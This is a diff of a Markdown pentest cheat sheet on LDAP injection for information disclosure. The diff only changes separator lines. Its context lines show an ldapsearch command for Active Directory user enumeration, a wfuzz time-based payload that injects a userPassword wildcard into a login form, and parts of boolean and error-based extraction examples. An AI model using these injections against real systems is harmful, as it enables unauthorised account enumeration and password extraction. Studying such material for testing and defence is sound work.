@@ -17,7 +17,7 @@ linked:
 ---
 # LDAP Injection - Information Disclosure / Blind Extraction
 
-***
+---
 
 ## Wildcards para Enumeración
 
@@ -35,7 +35,7 @@ linked:
 | `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)" sAMAccountName mail memberOf` | AD users con attributes específicos | Enumeration AD. |
 ^ldap-disclosure-wildcards
 
-___
+---
 
 ## Boolean-Based Char-by-Char
 
@@ -75,7 +75,7 @@ while True:
 print(f"Final: {result}")
 ```
 
-___
+---
 
 ## Time-Based Oracle
 
@@ -88,7 +88,7 @@ ___
 | `wfuzz --slice "FUZZ ~ <0.5 OR > 1.0" -d "username=admin)(userPassword=FUZZ*)&password=x" -w chars.txt https://target/login` | Filter por timing | wfuzz time-based. |
 ^ldap-disclosure-time
 
-___
+---
 
 ## Error-Based Leak
 
@@ -118,4 +118,4 @@ Bad search filter at character: 12: (&(uid=*)(uid=*)
                                               Reveals filter
 ```
 
-***
+---
